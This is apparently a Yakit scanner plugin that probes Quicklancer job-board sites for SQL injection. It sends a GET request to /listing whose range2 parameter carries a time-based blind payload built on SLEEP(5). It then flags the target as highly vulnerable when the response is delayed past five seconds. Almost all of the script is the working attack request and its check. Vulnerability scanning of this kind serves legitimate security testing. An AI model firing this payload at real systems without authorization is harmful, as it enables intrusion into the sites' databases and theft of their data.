yakit.AutoInitYakit()
loglevel("info")

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)
    packet = `GET /listing?cat=6&filter=1&job-type=1&keywords=Mr.&location=1&order=desc&placeid=US&placetype=country&range1=1&range2=1 AND (SELECT 9288 FROM (SELECT(SLEEP(5)))rZQl)&salary-type=1&sort=id&subcat= HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Host: {{params(target)}}
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

`

    begin_time=time.now()

    rsp,req,_ = poc.HTTP(packet,
    poc.params({"target": addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    poc.timeout(5),
    )
    resp_time=time.Since(begin_time)
    //dump(rsp)
    if int(resp_time) > 5000000000{
        risk.NewRisk(
            target, risk.severity("high"),
            risk.title(f"Quicklancer  SQL注入漏洞 "),
            risk.titleVerbose("Quicklancer  SQL注入漏洞"),
            risk.request(req),
            risk.response(rsp),
            risk.cve("no cve"),
            risk.details({
                "packet":string(packet),
            }),
        )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }

}
